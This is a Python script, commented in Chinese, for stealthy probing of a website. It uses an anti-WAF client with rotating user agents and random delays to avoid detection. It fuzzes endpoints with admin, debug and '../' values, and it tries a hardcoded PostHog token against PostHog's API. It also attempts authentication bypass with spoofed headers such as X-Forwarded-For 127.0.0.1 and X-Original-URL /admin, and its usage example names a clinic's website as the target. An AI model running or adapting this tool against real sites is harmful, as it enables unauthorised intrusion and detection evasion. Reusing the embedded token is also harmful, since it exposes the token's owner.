#!/usr/bin/env python3
"""
隐蔽JavaScript端点验证器 (Stealth JS Endpoint Validator)
集成反WAF引擎，绕过Framer平台的扫描器检测
专门解决308重定向问题
"""

import asyncio
import aiohttp
import ssl
import json
import time
from datetime import datetime
from typing import List, Dict, Any
from anti_waf_engine import AntiWAFEngine, StealthHTTPClient

class StealthJSEndpointValidator:
    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.results = []
        self.anti_waf = AntiWAFEngine()
        
        # 从JS挖掘中发现的高价值端点
        self.high_value_endpoints = [
            # API核心端点
            "/api",
            "/api/web_experiments/",
            "/api/early_access_features/",
            
            # 认证系统
            "/auth",
            "/Login",
            
            # CRUD操作
            "/create",
            "/Delete", 
            "/get",
            "/add",
            
            # 数据操作
            "/filter",
            "/EXPORT",
            "/view",
            
            # 调试端点
            "/debug/bootstrap",
            
            # PostHog端点
            "/i/v0/e",
            
            # 其他有趣的端点
            "/core-membership",
            "/call-scheduled",
            "/invite-next-steps",
            "/responsible-disclosure-policy"
        ]
        
        # 测试参数和负载
        self.test_params = {
            "token": ["test", "admin", "guest", "", "debug", "dev"],
            "id": ["1", "admin", "test", "../", "", "0", "999"],
            "user": ["admin", "test", "guest", "root"],
            "role": ["admin", "user", "guest", "manager"],
            "key": ["api", "secret", "debug", "dev"],
            "mode": ["debug", "dev", "test", "admin"]
        }
        
        # PostHog已知token (从JS挖掘发现)
        self.posthog_token = "phc_LU3KD8EdPiiXYVrJsCH13ZPipOrr2amMD2RLTa6iGAx"
        
    async def validate_endpoints_stealth(self):
        """使用隐蔽模式验证所有高价值端点"""
        print("🕵️ 隐蔽JavaScript端点验证器启动")
        print("=" * 60)
        print(f"🎯 目标: {self.target}")
        print(f"🔌 待验证端点: {len(self.high_value_endpoints)}")
        
        # 显示反WAF配置
        self.anti_waf.print_stealth_stats()
        print("=" * 60)
        
        start_time = time.time()
        
        async with StealthHTTPClient() as client:
            # Phase 1: 隐蔽基础端点测试
            await self._phase1_stealth_validation(client)
            
            # Phase 2: 隐蔽参数化测试
            await self._phase2_stealth_parameter_testing(client)
            
            # Phase 3: PostHog token隐蔽验证
            await self._phase3_stealth_posthog_validation(client)
            
            # Phase 4: 隐蔽认证绕过测试
            await self._phase4_stealth_auth_bypass(client)
            
        duration = time.time() - start_time
        self._generate_stealth_report(duration)
        
    async def _phase1_stealth_validation(self, client: StealthHTTPClient):
        """Phase 1: 隐蔽基础端点测试"""
        print("\n🕵️ Phase 1: 隐蔽基础端点测试")
        print("-" * 50)
        
        tasks = []
        for endpoint in self.high_value_endpoints:
            tasks.append(self._test_endpoint_stealth(client, endpoint))
            
        await asyncio.gather(*tasks, return_exceptions=True)
        
    async def _test_endpoint_stealth(self, client: StealthHTTPClient, endpoint: str):
        """使用隐蔽模式测试端点"""
        url = f"{self.target}{endpoint}"
        
        try:
            # 随机延迟以避免检测
            await self.anti_waf.random_delay(0.2, 0.8)
            
            async with await client.get(url, allow_redirects=False) as response:
                content = await response.read()
                
                result = {
                    "phase": "stealth_validation",
                    "endpoint": endpoint,
                    "url": url,
                    "method": "GET",
                    "status": response.status,
                    "size": len(content),
                    "headers": dict(response.headers),
                    "accessible": response.status in [200, 201],
                    "protected": response.status in [401, 403],
                    "redirect": response.status in [301, 302, 303, 307, 308],
                    "user_agent_used": response.request_info.headers.get('User-Agent', '')[:50] + "...",
                    "timestamp": datetime.now().isoformat()
                }
                
                if response.status == 200:
                    print(f"   ✅ 可访问: {endpoint} (200) - 隐蔽模式成功!")
                    # 分析响应内容
                    content_text = content.decode('utf-8', errors='ignore')
                    result["content_sample"] = content_text[:300]
                    result["contains_api"] = "api" in content_text.lower()
                    result["contains_admin"] = "admin" in content_text.lower()
                    result["contains_error"] = "error" in content_text.lower()
                elif response.status in [401, 403]:
                    print(f"   🔐 需认证: {endpoint} ({response.status}) - 端点存在!")
                elif response.status in [301, 302, 303, 307, 308]:
                    location = response.headers.get('location', '')
                    if "framer" not in location.lower():
                        print(f"   🔄 重定向: {endpoint} -> {location[:50]}...")
                    else:
                        print(f"   ⚠️ Framer重定向: {endpoint} (可能仍被检测)")
                    result["redirect_location"] = location
                else:
                    print(f"   ⚠️ 其他状态: {endpoint} ({response.status})")
                    
                self.results.append(result)
                
        except Exception as e:
            print(f"   ❌ 连接失败: {endpoint} - {e}")
            error_result = {
                "phase": "stealth_validation",
                "endpoint": endpoint,
                "url": url,
                "error": str(e),
                "timestamp": datetime.now().isoformat()
            }
            self.results.append(error_result)
            
    async def _phase2_stealth_parameter_testing(self, client: StealthHTTPClient):
        """Phase 2: 隐蔽参数化测试"""
        print("\n🔬 Phase 2: 隐蔽参数化测试")
        print("-" * 50)
        
        param_endpoints = [
            "/api/web_experiments/",
            "/api/early_access_features/", 
            "/debug/bootstrap"
        ]
        
        for endpoint in param_endpoints:
            await self._test_endpoint_with_stealth_params(client, endpoint)
            
    async def _test_endpoint_with_stealth_params(self, client: StealthHTTPClient, endpoint: str):
        """使用隐蔽模式测试带参数的端点"""
        print(f"🧪 隐蔽测试: {endpoint}")
        
        # 为每个参数类型测试多个值
        for param_name, values in self.test_params.items():
            for value in values[:3]:  # 限制测试量避免过于明显
                url = f"{self.target}{endpoint}?{param_name}={value}"
                await self._test_single_stealth_param_url(client, url, endpoint, param_name, value)
                
                # 增加随机延迟
                await self.anti_waf.random_delay(0.3, 1.0)
                
    async def _test_single_stealth_param_url(self, client: StealthHTTPClient, url: str, endpoint: str, param: str, value: str):
        """测试单个参数化URL - 隐蔽模式"""
        try:
            async with await client.get(url, allow_redirects=False) as response:
                content = await response.text()
                
                result = {
                    "phase": "stealth_parameter_testing",
                    "endpoint": endpoint,
                    "url": url,
                    "parameter": param,
                    "value": value,
                    "status": response.status,
                    "size": len(content),
                    "interesting": self._is_interesting_response(response.status, content),
                    "user_agent_used": response.request_info.headers.get('User-Agent', '')[:30] + "...",
                    "timestamp": datetime.now().isoformat()
                }
                
                if result["interesting"]:
                    print(f"   🎯 有趣响应: {param}={value} ({response.status}) - 隐蔽发现!")
                    result["content_sample"] = content[:200]
                    
                self.results.append(result)
                
        except Exception as e:
            pass
            
    async def _phase3_stealth_posthog_validation(self, client: StealthHTTPClient):
        """Phase 3: PostHog token隐蔽验证"""
        print("\n📊 Phase 3: PostHog Token隐蔽验证")
        print("-" * 50)
        
        # 测试PostHog API - 使用隐蔽模式
        posthog_endpoints = [
            "https://us.i.posthog.com/capture/",
            "https://us.i.posthog.com/decide/",
            "https://us.i.posthog.com/api/projects/",
            f"{self.target}/i/v0/e"
        ]
        
        for endpoint in posthog_endpoints:
            await self._test_stealth_posthog_endpoint(client, endpoint)
            await self.anti_waf.random_delay(0.5, 1.5)  # PostHog测试间隔更长
            
    async def _test_stealth_posthog_endpoint(self, client: StealthHTTPClient, endpoint: str):
        """隐蔽测试PostHog端点"""
        try:
            # 准备认证头部
            auth_headers = {
                "Authorization": f"Bearer {self.posthog_token}",
                "Content-Type": "application/json"
            }
            
            async with await client.get(endpoint, headers=auth_headers, allow_redirects=False) as response:
                content = await response.text()
                
                result = {
                    "phase": "stealth_posthog_validation",
                    "endpoint": endpoint,
                    "token_used": self.posthog_token,
                    "status": response.status,
                    "size": len(content),
                    "accessible": response.status in [200, 201],
                    "user_agent_used": response.request_info.headers.get('User-Agent', '')[:30] + "...",
                    "timestamp": datetime.now().isoformat()
                }
                
                if response.status in [200, 201]:
                    print(f"   🚨 Token有效: {endpoint} (200) - 隐蔽验证成功!")
                    result["content_sample"] = content[:300]
                elif response.status == 401:
                    print(f"   🔐 Token无效: {endpoint} (401)")
                else:
                    print(f"   ⚠️ 未知响应: {endpoint} ({response.status})")
                    
                self.results.append(result)
                
        except Exception as e:
            pass
            
    async def _phase4_stealth_auth_bypass(self, client: StealthHTTPClient):
        """Phase 4: 隐蔽认证绕过测试"""
        print("\n🔓 Phase 4: 隐蔽认证绕过测试")
        print("-" * 50)
        
        auth_endpoints = ["/auth", "/Login"]
        
        # 隐蔽的认证绕过技术
        bypass_headers_list = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Original-URL": "/admin"},
            {"X-Override-URL": "/admin"},
            {"X-Forwarded-Proto": "https"},
            {"CF-Connecting-IP": "127.0.0.1"}  # Cloudflare绕过
        ]
        
        for endpoint in auth_endpoints:
            for i, headers in enumerate(bypass_headers_list):
                await self._test_stealth_auth_bypass(client, endpoint, headers)
                
                # 隐蔽延迟，避免过于明显的测试模式
                if i % 3 == 0:
                    await self.anti_waf.random_delay(0.8, 2.0)
                    
    async def _test_stealth_auth_bypass(self, client: StealthHTTPClient, endpoint: str, headers: Dict[str, str]):
        """隐蔽认证绕过测试"""
        url = f"{self.target}{endpoint}"
        
        try:
            async with await client.get(url, headers=headers, allow_redirects=False) as response:
                if response.status == 200:
                    content = await response.text()
                    
                    result = {
                        "phase": "stealth_auth_bypass",
                        "endpoint": endpoint,
                        "bypass_headers": headers,
                        "status": response.status,
                        "size": len(content),
                        "success": True,
                        "content_sample": content[:200],
                        "user_agent_used": response.request_info.headers.get('User-Agent', '')[:30] + "...",
                        "timestamp": datetime.now().isoformat()
                    }
                    
                    print(f"   🚨 隐蔽认证绕过成功: {endpoint} with {headers}")
                    self.results.append(result)
                    
        except Exception as e:
            pass
            
    def _is_interesting_response(self, status: int, content: str) -> bool:
        """判断响应是否有趣"""
        if status in [200, 201]:
            return True
        if status in [401, 403] and len(content) > 100:
            return True
        if "error" in content.lower() and ("debug" in content.lower() or "stack" in content.lower()):
            return True
        if "api" in content.lower() and ("endpoint" in content.lower() or "documentation" in content.lower()):
            return True
        if "admin" in content.lower() and "panel" in content.lower():
            return True
        return False
        
    def _generate_stealth_report(self, duration: float):
        """生成隐蔽验证报告"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"stealth_endpoint_validation_{timestamp}.json"
        
        # 统计结果
        accessible_endpoints = [r for r in self.results if r.get("accessible")]
        protected_endpoints = [r for r in self.results if r.get("protected")]
        interesting_responses = [r for r in self.results if r.get("interesting")]
        auth_bypasses = [r for r in self.results if r.get("phase") == "stealth_auth_bypass" and r.get("success")]
        posthog_access = [r for r in self.results if r.get("phase") == "stealth_posthog_validation" and r.get("accessible")]
        
        # 检测绕过效果
        non_redirect_responses = [r for r in self.results if not r.get("redirect")]
        bypass_success_rate = len(non_redirect_responses) / len(self.results) if self.results else 0
        
        report = {
            "scan_info": {
                "target": self.target,
                "timestamp": datetime.now().isoformat(),
                "duration": duration,
                "stealth_mode": True,
                "endpoints_tested": len(self.high_value_endpoints),
                "accessible_endpoints": len(accessible_endpoints),
                "protected_endpoints": len(protected_endpoints),
                "interesting_responses": len(interesting_responses),
                "auth_bypass_successes": len(auth_bypasses),
                "posthog_access_attempts": len(posthog_access),
                "bypass_success_rate": bypass_success_rate
            },
            "anti_waf_config": {
                "user_agent_pool_size": len(self.anti_waf.user_agents),
                "header_variations": len(self.anti_waf.common_headers),
                "delay_range": "0.1-0.5秒"
            },
            "posthog_token": self.posthog_token,
            "validation_results": self.results
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
            
        print(f"\n🎯 隐蔽端点验证完成!")
        print(f"🕵️ 反WAF绕过率: {bypass_success_rate:.1%}")
        print(f"✅ 可访问端点: {len(accessible_endpoints)}")
        print(f"🔐 受保护端点: {len(protected_endpoints)}")
        print(f"🎯 有趣响应: {len(interesting_responses)}")
        print(f"🚨 认证绕过: {len(auth_bypasses)}")
        print(f"📊 PostHog访问: {len(posthog_access)}")
        print(f"⏱️ 验证耗时: {duration:.2f}秒")
        print(f"📄 详细报告: {filename}")
        
        if accessible_endpoints:
            print(f"\n🔥 隐蔽发现的可访问端点:")
            for result in accessible_endpoints:
                print(f"   ✅ {result['endpoint']}")
                
        if auth_bypasses:
            print(f"\n🚨 隐蔽认证绕过成功:")
            for result in auth_bypasses:
                print(f"   🔓 {result['endpoint']} via {result['bypass_headers']}")

async def main():
    import sys
    
    if len(sys.argv) != 2:
        print("使用方法: python js_endpoint_validator_stealth.py <target>")
        print("示例: python js_endpoint_validator_stealth.py https://asanoha-clinic.com")
        return
        
    target = sys.argv[1]
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
        
    validator = StealthJSEndpointValidator(target)
    await validator.validate_endpoints_stealth()

if __name__ == "__main__":
    asyncio.run(main()) 